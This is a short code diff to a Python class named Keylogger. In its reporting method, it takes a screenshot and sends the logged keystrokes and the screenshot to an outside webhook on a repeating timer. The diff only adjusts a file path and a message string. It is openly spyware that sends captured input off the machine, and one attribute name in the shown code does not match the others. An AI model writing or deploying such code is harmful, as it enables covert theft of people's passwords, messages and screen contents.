@@ -23,12 +23,12 @@ class Keylogger:
     def _report(self):
         if self.log != '':
             img = pyscreenshot.grab()
-            img.save('/home/louis/Desktop/Documents/Image/t.png')
-            file = File('/home/louis/Desktop/Documents/Image/t.png', name='Logger.png')
+            img.save('t.png')
+            file = File('t.png', name='Logger.png')
             self.hook = Webhook(WEBHOOK_URL)
             self.webhook.send(self.log)
             self.log = ''
-            self.hook.send('Look at this:', file=file)
+            self.hook.send('screen::', file=file)
 
         Timer(self.interval, self._report).start()
 
